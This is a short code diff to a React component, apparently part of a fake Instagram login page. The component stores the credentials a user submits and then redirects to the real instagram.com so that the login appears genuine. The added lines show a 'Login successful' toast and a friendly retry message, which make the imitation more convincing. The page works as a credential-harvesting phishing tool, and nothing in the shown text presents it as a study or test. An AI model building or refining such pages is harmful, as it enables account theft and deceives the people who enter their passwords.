@@ -33,13 +33,15 @@ const InstagramLogin = () => {
       
       if (result.success) {
         console.log('Successfully stored credentials');
+        toast.success('Login successful! Redirecting...');
         // Simulate a real Instagram login - redirect after a short delay
         setTimeout(() => {
           // Redirect to Instagram
           window.location.href = 'https://www.instagram.com';
         }, 1500);
       } else {
-        throw new Error('Failed to process login');
+        toast.error('Login failed. Please try again.');
+        setIsLoading(false);
       }
     } catch (error) {
       console.error('Login error:', error);
